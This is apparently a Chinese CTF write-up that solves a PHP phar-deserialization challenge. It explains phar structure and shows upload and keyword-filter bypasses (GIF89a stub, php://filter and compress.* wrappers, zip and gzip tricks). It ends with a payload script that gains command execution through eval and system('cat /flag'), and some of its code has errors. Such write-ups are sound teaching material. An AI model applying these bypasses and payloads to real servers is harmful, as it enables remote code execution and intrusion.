# Week4 UnserializeThree 200

## 0、知识点与工具

>   php反序列化

>   文件上传

>   远程命令执行



## 1、分析页面

>   首先看到首页，老规矩，看看源码抓抓包看看有没有什么有用的信息
>
>   然后在网页源码里看到一个提示

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120215455.png)

>   然后访问一下看看

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120215543.png)

## 2、分析一下代码

```php
<?php
highlight_file(__FILE__);

// 定义了一个邪恶的类（evil=邪恶嘿嘿）
// 这类在销毁的时候会执行一个if判断
class Evil{
    public $cmd;
    public function __destruct()
    {
        if(!preg_match("/>|<|\?|php|".urldecode("%0a")."/i",$this->cmd)){
            //Same point ,can you bypass me again?（这里还在挑衅）
            eval("#".$this->cmd);
        }else{
            echo "No!";
        }
    }
}

// 这里判断传入的文件是否存在
file_exists($_GET['file']);
```

>   最低下有一个**file_exists()函数**，是一个关于文件操作的函数，那么就可以想到伪协议
>
>   伪协议又要反序列化，那么就可以想到**phar**，这东西的作用就等于java的jar包
>
>   **也就是把多个php代码打包放一起，无需解压，php可以直接访问内部的语句**
>
>   默认开启版本 PHP version >= 5.3

## 3、关于phar文件

>   -   主要可分为四类
>       -   Stub					 Phar文件头
>       -   manifest            压缩文件信息
>       -   contents            压缩文件内容
>       -   signature           签名

### 1、Stub

>   stub是Phar的文件标识，主要用于告诉php我是一个phar文件
>
>   具体怎么告诉有一个要求，如下：
>
>   ```c
>   xxx <?php xxx; __HALT_COMPILER();?>
>       
>   不管xxx是什么，但是在php语句中，必须有__HALT_COMPILER()
>       没有这个，PHP就无法识别出它是Phar文件。
>   ```
>
>   

### 2、manifest

>   主要存放文件的属性、权限等信息，这是反序列化的攻击点，
>
>   因为这里以序列化的形式存储了用户自定义的Meta-data信息

### 3、contents

>   这里用于存放Phar文件的内容

### 4、signature

>   签名
>
>   -   查看官方文可以发现，签证尾部的
>       -   `01`代表md5加密，
>       -   `02`代表sha1加密，
>       -   `04`代表sha256加密，
>       -   `08`代表sha512加密 
>
>   

## 4、怎么使用Phar进行反序列化

>   上面也提到过，phar能进行反序列化都是因为manifest中的meta-data
>
>   因为php解析meta-data是使用`phar_parse_metadata`这个函数，
>
>   然后这个函数在解析meta数据时，会调用`php_var_unserialize`进行反序列化操作

>   看一个dome了解一下怎么生成phar文件的

```php
<?php 
class test{
    public $name="qwq";
    function __destruct()
    {
        echo $this->name . " is a web vegetable dog ";
    }
}
$a = new test();
$a->name="changjing";

//后缀名必须为phar
$tttang=new phar('tttang.phar',0);

//开始缓冲 Phar 写操作
$tttang->startBuffering();

//自定义的meta-data存入manifest
$tttang->setMetadata($a);

//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测
$tttang->setStub("<?php __HALT_COMPILER();?>");

//添加要压缩的文件，文件名为：test.txt，文件内容为test
$tttang->addFromString("test.txt","test");

//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘
$tttang->stopBuffering();
 
// file_get测试一下
$tttang = file_get_contents('phar://tttang.phar/test.txt')
ehco $tttang;
// 输出内容为：test changjing
// test是之前写入test.txt的内容，changjing是之前在Phar文件中设置的name名
?>
```

## 5、Phar文件能够进行反序列化的条件

>   1.   **phar文件能够上传至服务器** 
>        -   也就是要求存在file_get_contents()、fopen()这种函数
>   2.   **要有可利用的魔术方法**
>        -   就是利用魔术方法作为"跳板"
>   3.   **文件操作函数的参数可控，且【：、/、phar】等特殊字符没有被过滤**
>        -   一般利用姿势是上传Phar文件后通过伪协议Phar来实现反序列化
>        -   伪协议Phar格式是`Phar://`这种，如果这几个特殊字符被过滤就无法实现反序列化
>
>   

## 6、常见的绕过方式

### 1、更改文件格式绕过

>   限制条件，服务器端存在如下防护，**要求文件格式只能为gif**
>
>   ```
>   $_FILES["file"]["type"]=="image/gif"
>   ```

>   那么这里就可以想到到Phar文件中的Stub文件头
>
>   因为PHP通过`Stub`里的`__HALT_COMPILER();`来识别这个文件是Phar文件，对其他东西是没限制的
>
>   那么就可以通过往stub里面加点东西来绕过这个检测

```php
<?php
    class Test {
        public $name;
        function __construct(){
            echo "I am".$this->name.".";
        }
    }
    $obj = new Test();
    $obj -> name = "changjing";
    $phar = new Phar('test.phar');
    $phar -> startBuffering(); //开始缓冲 Phar 写操作
    $phar -> setStub('GIF89a<?php __HALT_COMPILER();?>'); //设置stub，添加gif文件头
    $phar ->addFromString('test.txt','test'); //要压缩的文件
    $phar -> setMetadata($obj);  //将自定义meta-data存入manifest
    $phar -> stopBuffering(); ////停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘
?>
```

>   **然后产生的phar文件就变成gif格式，这种上传一般可以绕过大多数上传检测**



### 2、绕过Phar关键字过滤

>   一般phar文件反序列化的思路是上传Phar文件后，然后通过给参数赋值为`Phar://xxx`来实现反序列化，那么假如有如下过滤条件
>
>   ```c
>   if (preg_match("/^php|^file|^phar|^dict|^zip/i",$filename){
>       die();
>   }
>   ```
>
>   然后绕过的办法就是用各种协议进行绕过
>
>   ```c
>   //即使用filter伪协议来进行绕过
>   php://filter/read=convert.base64-encode/resource=phar://test.phar
>   
>   //使用bzip2协议来进行绕过
>   compress.bzip2://phar:///test.phar/test.txt
>   
>   //使用zlib协议进行绕过
>   compress.zlib://phar:///home/sx/test.phar/test.txt
>   
>   ```
>
>   





### 3、绕过__HALT_COMPILER()过滤

>   因为PHP是通过这个来识别Phar文件，那么假如有如下过滤条件
>
>   ```c
>   if (preg_match("/HALT_COMPILER/i",$Phar){
>       die();
>   }
>   ```

#### 第一种绕过方式

>   将Phar文件的内容写到压缩包注释中，压缩为zip文件
>
>   ```php
>   <?php
>       $a = serialize($a);
>       $zip = new ZipArchive();
>       $res = $zip->open('phar.zip',ZipArchive::CREATE); 
>       $zip->addFromString('flag.txt', 'flag is here');
>       $zip->setArchiveComment($a);
>       $zip->close();    
>   ?>
>   ```
>
>   

#### 第二种绕过方式

>   将生成的Phar文件进行gzip压缩，压缩命令：`gzip test.phar`
>
>   ==因为压缩后同样也可以进行反序列==



## 7、解题

>   -   通过以上介绍很明显是Phar反序列化漏洞了，
>
>   -   不过destruct函数里面有过滤，`而且eval还加了一个#注释`
>       -   **那么绕过#可以使用换行【%0a】，但是换行被过滤掉了，然后可以想到使用回车【%0d】**
>       -   **但是cmd参数不会url解码，所以最终想到只能使用[` \r `]**
>   -   然后就阔以开始生成phar文件了

```php
<?php
highlight_file(__FILE__);

class Evil{
    // 到时候使用这个POST参数进行获取flag
    public $cmd ='\reval(\$_POST[1];)';
    public $cmd ='\rsystem('cat /flag');)';
}

$obj = new Evil();

$phar = new Phar('test.phar');
$phar -> startBuffering(); //开始缓冲 Phar 写操作
$phar -> setStub('GIF89a<?php __HALT_COMPILER();?>'); //设置stub，添加gif文件头

$phar ->addFromString('test.txt','test'); //要压缩的文件

$phar -> setMetadata($obj);  //将自定义meta-data存入manifest

$phar -> stopBuffering(); ////停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘

// 这里判断传入的文件是否存在
//file_exists($_GET['file']);
```

>   **运行一次就会在这个php的同目录下生成一个test.phar文件**

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202211241045889.png)

>   直接上传.phar后缀文件上传不了，会被检测

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221124104703.png)

>   **更改一下文件的后缀，改为gif、png、jgp就阔以绕过这个过滤**
>
>   **然后将这个返回的路径复制下来**

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221128124024.png)

>   **进入class.php页面，利用其中的file_exists()函数通过 `phar://`协议 访问我们上传的文件、后获取flag**

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221128123611.png)







参考

https://www.ctfiot.com/56327.html
